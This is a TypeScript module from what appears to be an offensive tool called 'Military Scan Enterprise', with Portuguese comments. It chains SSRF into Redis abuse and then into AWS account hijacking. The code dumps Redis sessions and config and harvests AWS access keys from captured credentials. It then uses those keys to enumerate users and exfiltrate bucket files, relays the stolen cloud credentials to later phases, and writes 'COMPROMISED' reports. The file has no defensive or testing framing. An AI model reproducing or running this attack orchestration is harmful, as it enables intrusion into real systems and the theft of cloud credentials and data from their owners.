// server/abuse/chainExecutor.ts
import { executeRedisAbuse, RedisDump, writeRedisDump, extractAwsFromRedis } from './redisAbuse';
import { executeAwsAbuse, AwsResult } from './awsAbuse';
import { relayIngest } from '../credentialRelay';
import { writeDumpFile } from '../admin';

export interface ChainStep {
  step: string;
  result: any;
  timestamp: string;
}

export interface ChainExecutionResult {
  chain: string;
  steps: ChainStep[];
  startedAt: string;
  completedAt: string;
  success: boolean;
  finalVerdict: 'COMPROMISED' | 'PARTIAL' | 'FAILED';
  dumpFile?: string;
}

/**
 * Extrai chave AWS dos dados da Phase 8 ou do Redis
 */
function extractAwsKeyFromPhase(phase8Data: any, redisResult?: RedisDump): { accessKey: string; secretKey: string } | null {
  // Tenta extrair do Redis primeiro (se passado)
  if (redisResult) {
    const fromRedis = extractAwsFromRedis(redisResult);
    if (fromRedis) return fromRedis;
  }

  // Tenta extrair dos dados da Phase 8
  if (phase8Data?.dictionaryBoosts?.awsKeyForce) {
    // Procura em confirmations ou telemetry
    const allCreds = phase8Data.telemetry?.allCapturedCreds || [];
    for (const cred of allCreds) {
      const match = cred.match(/AKIA[0-9A-Z]{16}/);
      if (match) {
        return {
          accessKey: match[0],
          secretKey: cred // simplificado - idealmente extrairia o secret real
        };
      }
    }
  }

  return null;
}

/**
 * Executa a cadeia SSRF → REDIS → AWS
 */
export async function executeRedisToAwsChain(
  target: string,
  redisPassword: string,
  phase8Data?: any
): Promise<ChainExecutionResult> {
  const startedAt = new Date().toISOString();
  const steps: ChainStep[] = [];

  try {
    // Passo 1: Redis Abuse
    console.log(`[CHAIN] Executando Redis abuse em ${target} com senha ${redisPassword}`);
    const redisResult = await executeRedisAbuse(target, redisPassword);

    steps.push({
      step: 'SSRF → REDIS',
      result: {
        keysFound: redisResult.keysFound,
        sessionsCaptured: redisResult.sessionsCaptured,
        configExtracted: redisResult.configExtracted
      },
      timestamp: new Date().toISOString()
    });

    // Gera dump do Redis
    const redisDumpFile = writeRedisDump(redisResult, target);
    console.log(`[CHAIN] Redis dump gerado: ${redisDumpFile}`);

    // Passo 2: Verifica se encontrou chaves AWS no Redis
    const awsKey = extractAwsKeyFromPhase(phase8Data, redisResult);

    if (awsKey) {
      console.log(`[CHAIN] Chave AWS encontrada no Redis: ${awsKey.accessKey}`);

      // Passo 3: AWS Abuse
      const awsResult = await executeAwsAbuse(awsKey.accessKey, awsKey.secretKey, target);

      steps.push({
        step: 'REDIS → AWS',
        result: {
          success: awsResult.success,
          bucketName: awsResult.bucketName,
          filesExfiltrated: awsResult.filesExfiltrated,
          accountId: awsResult.accountId,
          usersEnumerated: awsResult.usersEnumerated
        },
        timestamp: new Date().toISOString()
      });

      // Se AWS funcionou, considera COMPROMISED
      if (awsResult.success) {
        // Injeta no relay para próximas fases
        relayIngest([{
          key: 'AWS_BUCKET',
          value: awsResult.bucketName || '',
          type: 'CLOUD_CREDENTIAL',
          source: 'chain_aws',
          target,
          capturedAt: new Date().toISOString()
        }]);

        const completedAt = new Date().toISOString();

        // Gera relatório da cadeia
        const chainResult: ChainExecutionResult = {
          chain: 'SSRF_PIVOT → REDIS_ABUSE → CLOUD_HIJACK',
          steps,
          startedAt,
          completedAt,
          success: true,
          finalVerdict: 'COMPROMISED'
        };

        // Salva relatório
        const reportFile = writeChainReport(chainResult, target);
        chainResult.dumpFile = reportFile;

        return chainResult;
      }
    } else {
      console.log(`[CHAIN] Nenhuma chave AWS encontrada no Redis`);

      steps.push({
        step: 'REDIS → AWS',
        result: {
          success: false,
          reason: 'No AWS keys found in Redis'
        },
        timestamp: new Date().toISOString()
      });
    }

    // Se chegou aqui, só Redis funcionou
    const completedAt = new Date().toISOString();
    const chainResult: ChainExecutionResult = {
      chain: 'SSRF_PIVOT → REDIS_ABUSE',
      steps,
      startedAt,
      completedAt,
      success: true,
      finalVerdict: 'PARTIAL'
    };

    const reportFile = writeChainReport(chainResult, target);
    chainResult.dumpFile = reportFile;

    return chainResult;

  } catch (error: any) {
    console.error(`[CHAIN] Erro na execução: ${error.message}`);

    const completedAt = new Date().toISOString();
    const chainResult: ChainExecutionResult = {
      chain: 'SSRF_PIVOT → REDIS_ABUSE',
      steps: [...steps, {
        step: 'ERROR',
        result: { error: error.message },
        timestamp: new Date().toISOString()
      }],
      startedAt,
      completedAt,
      success: false,
      finalVerdict: 'FAILED'
    };

    return chainResult;
  }
}

/**
 * Executa qualquer cadeia baseada no nome
 */
export async function executeOptimalChain(
  chainName: string,
  target: string,
  credentials: {
    redisPass?: string;
    awsKey?: { accessKey: string; secretKey: string };
  },
  phase8Data?: any
): Promise<ChainExecutionResult> {

  // Mapeia cadeias para funções específicas
  const chainMap: Record<string, Function> = {
    'SSRF_PIVOT → REDIS_ABUSE': () => executeRedisToAwsChain(target, credentials.redisPass || '', phase8Data),
    'SSRF_PIVOT → DATA_EXFIL_CONFIRM': () => executeRedisToAwsChain(target, credentials.redisPass || '', phase8Data),
    'DATA_EXFIL_CONFIRM → REDIS_ABUSE': () => executeRedisToAwsChain(target, credentials.redisPass || '', phase8Data)
  };

  const executor = chainMap[chainName];
  if (executor) {
    return await executor();
  }

  // Fallback: tenta Redis se tiver senha
  if (credentials.redisPass) {
    return await executeRedisToAwsChain(target, credentials.redisPass, phase8Data);
  }

  throw new Error(`No executor found for chain: ${chainName}`);
}

/**
 * Gera relatório da cadeia
 */
function writeChainReport(result: ChainExecutionResult, target: string): string {
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `Chain-Execution-${ts}.json`;

  const content = JSON.stringify({
    _header: {
      tool: 'Military Scan Enterprise',
      module: 'ChainExecutor',
      type: 'CHAIN_EXECUTION_REPORT',
      target,
      timestamp: new Date().toISOString(),
      verdict: result.finalVerdict,
      success: result.success
    },
    chain: result.chain,
    steps: result.steps.map(step => ({
      ...step,
      result: step.result
    })),
    startedAt: result.startedAt,
    completedAt: result.completedAt,
    duration: new Date(result.completedAt).getTime() - new Date(result.startedAt).getTime()
  }, null, 2);

  writeDumpFile(filename, content);
  return filename;
}